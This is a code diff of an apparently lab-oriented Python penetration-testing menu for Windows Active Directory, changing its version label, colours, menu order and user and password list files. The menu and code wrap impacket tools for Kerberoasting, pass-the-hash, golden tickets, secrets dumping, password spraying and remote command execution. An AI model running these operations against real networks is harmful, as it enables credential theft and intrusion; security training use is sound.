@@ -9,7 +9,7 @@
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde                                                                
+# Version : Forest                                                                
 # Details : Load required imports.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -23,11 +23,14 @@ import datetime
 import linecache
 
 from termcolor import colored					# pip install termcolor
+colour1 = 'yellow'
+colour2 = 'green'
+colour3 = 'white'
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : Monteverde                                                                
+# Version : Forest                                                                
 # Details : Conduct simple and routine tests on user supplied arguements.   
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -36,19 +39,12 @@ if os.geteuid() != 0:
     print("\n[*] Please run this python3 script as root...")
     exit(True)
 
-BH1 = ""
-BH2 = ""
-
-if len(sys.argv) == 3:
-   BH1 = sys.argv[1]	# NEO4J USERNAME
-   BH2 = sys.argv[2]	# NEO4J PASSWORD
-
 BUG = 0			# BUGHUNT ON/OFF
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : Monteverde
+# Version : Forest
 # Details : Create function calls from main.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -88,7 +84,7 @@ def gettime(value):
 
 def command(command):
    if BUG == 1:
-         print(colored(command, 'white'))
+         print(colored(command, colour3))
    os.system(command)
    return
 
@@ -98,174 +94,174 @@ def prompt():
 
 def display():
    print('\u2554' + ('\u2550')*36 + '\u2566' + ('\u2550')*33 + '\u2566' + ('\u2550')*61 + '\u2557')
-   print('\u2551' + (" ")*12 + colored("REMOTE SYSTEM",'white') +  (" ")*11 + '\u2551' + (" ")*10 + colored("SYSTEM SHARES",'white') + (" ")*10 + '\u2551' + (" ")*21 +  colored("USER INFORMATION",'white') + (" ")*24 + '\u2551') 
+   print('\u2551' + (" ")*12 + colored("REMOTE SYSTEM",colour3) +  (" ")*11 + '\u2551' + (" ")*10 + colored("SYSTEM SHARES",colour3) + (" ")*10 + '\u2551' + (" ")*21 +  colored("USER INFORMATION",colour3) + (" ")*24 + '\u2551') 
    print('\u2560' + ('\u2550')*14 + '\u2564' + ('\u2550')*21 + '\u256C' + ('\u2550')*12 + '\u2550' + ('\u2550')*20 + '\u256C' + ('\u2550')*61 + '\u2563')
   
    print('\u2551' + " DNS SERVER   " + '\u2502', end=' ')
    if DNS == "EMPTY              ":
-      print(colored(DNS[:COL1],'yellow'), end=' ')
+      print(colored(DNS[:COL1],colour1), end=' ')
    else:
-      print(colored(DNS[:COL1],'blue'), end=' ')
+      print(colored(DNS[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(SHAR[0],'blue'), end=' ')
+   print(colored(SHAR[0],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(USER[0],'blue'), end=' ')
-   print(colored(PASS[0],'blue'), end=' ')
+   print(colored(USER[0],colour2), end=' ')
+   print(colored(PASS[0],colour2), end=' ')
    print('\u2551')
    print('\u2551' + " REMOTE IP    " + '\u2502', end=' ')
    if TIP == "EMPTY              ":
-      print(colored(TIP[:COL1],'yellow'), end=' ')
+      print(colored(TIP[:COL1],colour1), end=' ')
    else:
-      print(colored(TIP[:COL1],'blue'), end=' ')
+      print(colored(TIP[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(SHAR[1],'blue'), end=' ')
+   print(colored(SHAR[1],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(USER[1],'blue'), end=' ')
-   print(colored(PASS[1],'blue'), end=' ')
+   print(colored(USER[1],colour2), end=' ')
+   print(colored(PASS[1],colour2), end=' ')
    print('\u2551')
 
    print('\u2551' + " USERNAME     " + '\u2502', end=' ')
    if USR[:2] == '""':
-      print(colored(USR[:COL1],'yellow'), end=' ')
+      print(colored(USR[:COL1],colour1), end=' ')
    else:
-      print(colored(USR[:COL1],'blue'), end=' ')
+      print(colored(USR[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(SHAR[2],'blue'), end=' ')
+   print(colored(SHAR[2],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(USER[2],'blue'), end=' ')
-   print(colored(PASS[2],'blue'), end=' ')
+   print(colored(USER[2],colour2), end=' ')
+   print(colored(PASS[2],colour2), end=' ')
    print('\u2551')
 
    print('\u2551' + " PASSWORD     " + '\u2502', end=' ')
    if PAS[:2] == '""':
-      print(colored(PAS[:COL1],'yellow'), end=' ')
+      print(colored(PAS[:COL1],colour1), end=' ')
    else:
-      print(colored(PAS[:COL1],'blue'), end=' ')
+      print(colored(PAS[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(SHAR[3],'blue'), end=' ')
+   print(colored(SHAR[3],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(USER[3],'blue'), end=' ')
-   print(colored(PASS[3],'blue'), end=' ')
+   print(colored(USER[3],colour2), end=' ')
+   print(colored(PASS[3],colour2), end=' ')
    print('\u2551')
 
    print('\u2551' + " NTLM HASH    " + '\u2502', end=' ')
    if NTM == "EMPTY              ":
-      print(colored(NTM[:COL1],'yellow'), end=' ')
+      print(colored(NTM[:COL1],colour1), end=' ')
    else:
-      print(colored(NTM[:COL1],'blue'), end=' ')
+      print(colored(NTM[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(SHAR[4],'blue'), end=' ')
+   print(colored(SHAR[4],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(USER[4],'blue'), end=' ')
-   print(colored(PASS[4],'blue'), end=' ')
+   print(colored(USER[4],colour2), end=' ')
+   print(colored(PASS[4],colour2), end=' ')
    print('\u2551')
 
    print('\u2551' + " DOMAIN NAME  " + '\u2502', end=' ')
    if DOM == "EMPTY              ":
-      print(colored(DOM[:COL1],'yellow'), end=' ')
+      print(colored(DOM[:COL1],colour1), end=' ')
    else:
-      print(colored(DOM[:COL1],'blue'), end=' ')
+      print(colored(DOM[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(SHAR[5],'blue'), end=' ')
+   print(colored(SHAR[5],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(USER[5],'blue'), end=' ')
-   print(colored(PASS[5],'blue'), end=' ')
+   print(colored(USER[5],colour2), end=' ')
+   print(colored(PASS[5],colour2), end=' ')
    print('\u2551')
 
    print('\u2551' + " DOMAIN SID   " + '\u2502', end=' ')
    if SID == "EMPTY              ":
-      print(colored(SID[:COL1],'yellow'), end=' ')
+      print(colored(SID[:COL1],colour1), end=' ')
    else:
-      print(colored(SID[:COL1],'blue'), end=' ')
+      print(colored(SID[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(SHAR[6],'blue'), end=' ')
+   print(colored(SHAR[6],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(USER[6],'blue'), end=' ')
-   print(colored(PASS[6],'blue'), end=' ')
+   print(colored(USER[6],colour2), end=' ')
+   print(colored(PASS[6],colour2), end=' ')
    print('\u2551')     
 
    print('\u2551' + " SHARE NAME   " + '\u2502', end=' ')
    if TSH == "EMPTY              ":
-      print(colored(TSH[:COL1],'yellow'), end=' ')
+      print(colored(TSH[:COL1],colour1), end=' ')
    else:
-      print(colored(TSH[:COL1],'blue'), end=' ')
+      print(colored(TSH[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(SHAR[7],'blue'), end=' ')
+   print(colored(SHAR[7],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(USER[7],'blue'), end=' ')
-   print(colored(PASS[7],'blue'), end=' ')
+   print(colored(USER[7],colour2), end=' ')
+   print(colored(PASS[7],colour2), end=' ')
    print('\u2551')   
 
    print('\u2551' + " IMPERSONATE  " + '\u2502', end=' ')
    if IMP == "Administrator      ":
-      print(colored(IMP[:COL1],'yellow'), end=' ')
+      print(colored(IMP[:COL1],colour1), end=' ')
    else:
-      print(colored(IMP[:COL1],'blue'), end=' ')
+      print(colored(IMP[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(SHAR[8],'blue'), end=' ')
+   print(colored(SHAR[8],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(USER[8],'blue'), end=' ')
-   print(colored(PASS[8],'blue'), end=' ')
+   print(colored(USER[8],colour2), end=' ')
+   print(colored(PASS[8],colour2), end=' ')
    print('\u2551')      
 
    print('\u2551' + " WIN COMMAND  " + '\u2502', end=' ')
    if CMD == "whoami             ":
-      print(colored(CMD[:COL1],'yellow'), end=' ')
+      print(colored(CMD[:COL1],colour1), end=' ')
    else:
-      print(colored(CMD[:COL1],'blue'), end=' ')
+      print(colored(CMD[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(SHAR[9],'blue'), end=' ')
+   print(colored(SHAR[9],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(USER[9],'blue'), end=' ')
-   print(colored(PASS[9],'blue'), end=' ')
+   print(colored(USER[9],colour2), end=' ')
+   print(colored(PASS[9],colour2), end=' ')
    print('\u2551')
 
    print('\u2551' + " CURRENT TIME " + '\u2502', end=' ')
    if SKEW == 0:
-      print(colored(LTM[:COL1],'yellow'), end=' ')
+      print(colored(LTM[:COL1],colour1), end=' ')
    else:
-      print(colored(LTM[:COL1],'blue'), end=' ')
+      print(colored(LTM[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(SHAR[10],'blue'), end=' ')
+   print(colored(SHAR[10],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(USER[10],'blue'), end=' ')
-   print(colored(PASS[10],'blue'), end=' ')
+   print(colored(USER[10],colour2), end=' ')
+   print(colored(PASS[10],colour2), end=' ')
    print('\u2551')   
 
    print('\u2551' + " MY DIRECTORY " + '\u2502', end=' ')
    if DIR == "WORKAREA           ":
-      print(colored(DIR[:COL1],'yellow'), end=' ')
+      print(colored(DIR[:COL1],colour1), end=' ')
    else:
-      print(colored(DIR[:COL1],'blue'), end=' ')
+      print(colored(DIR[:COL1],colour2), end=' ')
    print('\u2551', end=' ')
-   print(colored(SHAR[11],'blue'), end=' ')
+   print(colored(SHAR[11],colour2), end=' ')
    print('\u2551', end=' ')
    if USER[12][:1] != " ":
       print(colored(USER[11],'red'), end=' ')
    else:
-      print(colored(USER[11],'blue'), end=' ')
-   print(colored(PASS[11],'blue'), end=' ')
+      print(colored(USER[11],colour2), end=' ')
+   print(colored(PASS[11],colour2), end=' ')
    print('\u2551')
 
    print('\u2560' + ('\u2550')*14 + '\u2567'+ ('\u2550')*21  + '\u2569' + ('\u2550')*12 + '\u2550' + ('\u2550')*20 + '\u2569' + ('\u2550')*61 + '\u2563')
 
 def options():
-   print('\u2551' + "(0) Autofill REMOTE IP (10) Re/Set WINCOMMAND (20) Get Arch (30) Enum4Linux     (40) Kerb Users Info (50) Golden PAC   (60) FTP     " + '\u2551')
-   print('\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set CLOCK TIME (21) Net View (31) WinDap Search  (41) Kerb Filter     (51) Domain Dump  (61) SSH     " + '\u2551')
-   print('\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set DIRECTORY  (22) Services (32) Lookup Sids    (42) Kerb Bruteforce (52) BH ACLPWN    (62) TelNet  " + '\u2551')
-   print('\u2551' + "(3) Re/Set USERNAME    (13) Check Connection  (23) AtExec   (33) Sam Dump Users (43) Kerb Roasting   (53) Secrets Dump (63) NetCat  " + '\u2551')
-   print('\u2551' + "(4) Re/Set PASSWORD    (14) Check DNS Records (24) DcomExec (34) Rpc Dump       (44) Kerb ASREPRoast (54) CrackMapExec (64) WinRM   " + '\u2551')
-   print('\u2551' + "(5) Re/Set NTLM HASH   (15) Check DNS SERVER  (25) PsExec   (35) REGistery      (45) PASSWORD2HASH   (55) PsEcec HASH  (65) Desktop " + '\u2551')
-   print('\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap O/S + Skew   (26) SmbExec  (36) Smb Client     (46) Pass the Hash   (56) SmbExec HASH (66)         " + '\u2551')
-   print('\u2551' + "(7) Re/Set DOMAIN SID  (17) Nmap Subdomains   (27) WmiExec  (37) SmbMap SHARE   (47) Pass the Ticket (57) WmiExec HASH (67)         " + '\u2551')
-   print('\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Intense TCP  (28) IfMap    (38) SmbMount SHARE (48) Silver Ticket   (58) Gen UserList (68)         " + '\u2551')
-   print('\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Slow & Full  (29) OpDump   (39) Rpc Client     (49) Golden Ticket   (59) User Editor  (69) Quit!!  " + '\u2551')
+   print('\u2551' + "(0) Autofill REMOTE IP (10) Re/Set WINCOMMAND (20) Get Arch (30) Enum4Linux     (40) Kerb Users Info (50) Golden PAC   (60) PASpray " + '\u2551')
+   print('\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set CLOCK TIME (21) Net View (31) WinDap Search  (41) Kerb Filter     (51) Domain Dump  (61) ACLPwn  " + '\u2551')
+   print('\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set DIRECTORY  (22) Services (32) Lookup Sids    (42) Kerb Bruteforce (52) Secrets Dump (62) FTP     " + '\u2551')
+   print('\u2551' + "(3) Re/Set USERNAME    (13) Check Connection  (23) AtExec   (33) Sam Dump Users (43) Kerb Roasting   (53) CrackMapExec (63) SSH     " + '\u2551')
+   print('\u2551' + "(4) Re/Set PASSWORD    (14) Check DNS Records (24) DcomExec (34) Rpc Dump       (44) Kerb ASREPRoast (54) PsExec HASH  (64) TelNet  " + '\u2551')
+   print('\u2551' + "(5) Re/Set NTLM HASH   (15) Check DNS SERVER  (25) PsExec   (35) REGistery      (45) PASSWORD2HASH   (55) SmbExec HASH (65) NetCat  " + '\u2551')
+   print('\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap O/S + Skew   (26) SmbExec  (36) Smb Client     (46) Pass the Hash   (56) WmiExec HASH (66) WinRm   " + '\u2551')
+   print('\u2551' + "(7) Re/Set DOMAIN SID  (17) Nmap Subdomains   (27) WmiExec  (37) SmbMap SHARE   (47) Pass the Ticket (57) GenUser List (67) Desktop " + '\u2551')
+   print('\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Intense TCP  (28) IfMap    (38) SmbMount SHARE (48) Silver Ticket   (58) USER Editor  (68)         " + '\u2551')
+   print('\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Slow & Full  (29) OpDump   (39) Rpc Client     (49) Golden Ticket   (59) PASS Editor  (69) Quit!!  " + '\u2551')
    print('\u255A' + ('\u2550')*132 + '\u255D')
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde                                                                
+# Version : Forest                                                                
 # Details : Display universal header.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -282,7 +278,7 @@ print("BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS\n")
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : Monteverde
+# Version : Forest
 # Details : Boot the system and initialise program files and variables.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -294,11 +290,17 @@ if not os.path.exists("WORKAREA"):
 else:
    print("[+] Work area already exists...")		# DEFAULT WORK DIRECTORY
 
-if not os.path.exists("users.txt"):			
-   command("touch users.txt")
-   print("[+] File users.txt created...")
+if not os.path.exists("usernames.txt"):			
+   command("touch usernames.txt")
+   print("[+] File usernames.txt created...")
 else:
-   print("[+] File users.txt already exists...")	# USER LIST
+   print("[+] File usernames.txt already exists...")	# USER LIST
+   
+if not os.path.exists("passwords.txt"):			
+   command("touch passwords.txt")
+   print("[+] File passwords.txt created...")
+else:
+   print("[+] File passwords.txt already exists...")	# PASSWORD LIST
 
 print("[+] Populating system variables...")
 
@@ -318,7 +320,7 @@ PASS = [" "*COL4]*MAXX  # PASSWORDS
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : Monteverde
+# Version : Forest
 # Details : Check the config file for stored variables.
 # Modified: N/A                                                               	
 # -------------------------------------------------------------------------------------
@@ -365,19 +367,12 @@ else:
    if len(LTM) < COL1: LTM = padding(LTM, COL1)
    if len(DIR) < COL1: DIR = padding(DIR, COL1)
 
-if BH1 != "":
-   print("[+] Starting neo4j database...")
-   command("touch log.txt")
-   command("neo4j start   >> log.txt 2>&1")
-#  command("neo4j console >> log.txt 2>&1")
-   os.remove("log.txt")
-
 input("\n[*] Press ENTER key to continue...")
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : Monteverde
+# Version : Forest
 # Details : Start the main menu controller.
 # Modified: N/A                                                               	
 # -------------------------------------------------------------------------------------
@@ -393,7 +388,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - Autofill DOMAIN, SID, SHARES, USERS etc.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -484,7 +479,7 @@ while True:
  
             os.remove("domusers1.txt")
             os.remove("count2.txt")
-            os.remove("users.txt")
+            os.remove("usernames.txt")
  
             for x in range(0, count2):
                test5 = linecache.getline("domusers2.txt", x + 1)
@@ -497,7 +492,7 @@ while True:
                USER[x] = USER[x].replace("rid","")
                print ("[+] Found user", USER[x])
                if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
-               command("echo " + USER[x] + " >> users.txt")
+               command("echo " + USER[x] + " >> usernames.txt")
          else:
             print("[-] Unable to enumerate domain users...")
       
@@ -510,7 +505,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - Change remote DNS SERVER name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -531,7 +526,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - Change remote IP address.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -549,7 +544,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - Change the current USER.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -570,7 +565,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - Change the current USERS PASSWORD.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -588,7 +583,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - Change the current USERS HASH value.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -606,7 +601,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - Change the remote DOMAIN name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -627,7 +622,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - Change the remote DOMAIN SID value.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -645,7 +640,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - Change the remote SHARE name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -663,7 +658,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - Change the remote Windows USER to impersonate.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -681,7 +676,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - Change the remote windows COMMAND.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -699,7 +694,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - Reset local TIME to match kerberos skew. 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -718,7 +713,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - Change local working DIRECTORY.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -740,7 +735,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - Ping localhost IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -755,7 +750,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - adidnsdump -u DOMAIN\USER -p PASSWORD DOMAIN --include-tombstoned -r
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -780,7 +775,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - fierce -dns DNS SERVER.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -795,7 +790,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - nmap -sU -O -p 123 --script ntp-info IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -810,7 +805,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - nmap -p 80 --script http-vhosts --script-args http-vhosts.domain=DOMAIN IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -833,7 +828,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - Intense quick TCP scan.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -848,7 +843,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - Full, slow and comprehensive nmap scan.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -863,7 +858,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - getArch.py -target IP
 # Details : 32/64 bit
 # Modified: N/A
@@ -877,7 +872,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - netview.py DOMAIM/USER:PASSWORD -target IP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -900,7 +895,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - services.py USER:PASSWOrd@IP list.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -923,7 +918,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - atexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -946,7 +941,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - dcomexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -968,7 +963,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - psexec.py DOMAIN/USER:PASSWORD@IP cmd.exe.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1010,7 +1005,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - smbexec.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1033,7 +1028,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - wmiexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1056,7 +1051,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - ifmap.py IP 135.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1069,7 +1064,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - opdump.py IP 135 99FCFEC4-5260-101B-BBCB-00AA0021347A 0.0.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1083,7 +1078,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - enum4linux -u "" -p "" REMOTE IP.
 # Details : Anonymous login check.
 # Modified: N/A
@@ -1101,7 +1096,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - windapsearch.py -d IP -u DOMAIN\\USER -p PASSWORD -GUC --da --full.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1124,7 +1119,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - lookupsid.py DOMAIN/USR:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1158,7 +1153,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - ./samrdump.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1176,8 +1171,8 @@ while True:
 
       if CheckParams != 1:
          print("\n[*] Enumerating, please wait...")
-         os.remove("users.txt")					# DELETE CURRENT VERSION
-         command("touch users.txt")				# CREATE EMPTY NEW ONE
+         os.remove("usernames.txt")					# DELETE CURRENT VERSION
+         command("touch usernames.txt")				# CREATE EMPTY NEW ONE
          command(PATH + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > USERS.tmp")
          command("sed -i -n '/Found user: /p' USERS.tmp")	# SELECT ONLY FOUND USERS
          command("sort USERS.tmp > USERS2.tmp")			# SORT USERS ALPHANUMERICALLY 
@@ -1193,7 +1188,7 @@ while True:
                USER[x] = padding(USER[x], COL3)
                if USER[x] != "":
                   print("[+] Found user " + USER[x])
-                  command("echo " + USER[x] + " >> users.txt")	# ASSIGN USERS NAME
+                  command("echo " + USER[x] + " >> usernames.txt")	# ASSIGN USERS NAME
                else:
                   USER[x] = " "*COL3				# ASSIGN EMPTY USERS
                PASS[x] = "."*COL4				# RESET PASSWORDS
@@ -1212,7 +1207,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - ./rpcdump.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1235,7 +1230,7 @@ while True:
